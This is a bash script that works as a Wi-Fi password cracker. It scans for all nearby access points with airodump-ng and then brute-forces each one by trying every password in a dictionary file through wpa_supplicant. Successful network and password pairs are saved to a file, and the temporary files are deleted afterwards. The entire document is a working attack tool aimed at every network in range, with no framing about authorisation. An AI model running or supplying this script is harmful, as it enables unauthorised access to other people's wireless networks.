#!/bin/bash

# ========== GET BSSID ==========
airodump-ng wlan1 --output-format csv -w air &
sleep 5
killall airodump-ng
touch bssid.txt
sleep 1

cat air-01.csv | awk {'print $1'} | grep --colour=never ":" | sed 's/.$//' > bssid.txt
count=$(cat bssid.txt | wc -l)

echo ""
echo "[+] Complete!!!"
echo "Count bssid's: $count"
# ===============================

# ========== CRACK ==========
c=0
IFS=$'\n'
for bss in $(cat bssid.txt):
do
  for pass in $(cat dict.txt):
  do
    c=$((c+=1))
    echo -e "[$c]\t$bss : $pass"
    echo -e "\tnetwork={" > wpa_supplicant.conf
    echo -e "\tbssid=$bss" >> wpa_supplicant.conf
    echo -e "\tpsk=\"$pass\"" >> wpa_supplicant.conf
    echo "}" >> wpa_supplicant.conf
    
    timeout 10 wpa_supplicant -i wlan0 -c wpa_supplicant.conf 2>&1 > wpa_supplicant.log

    if grep -q "completed" "wpa_supplicant.log";
    then
      echo "[+] True"
      echo "[+] $bss:$pass" >> found.txt
    else
      echo "[-] False"
    fi

 done
  echo ""
done


# ===========================



# ========== CLEAN ==========
rm -rf air-01.csv bssid.txt wpa_supplicant.*
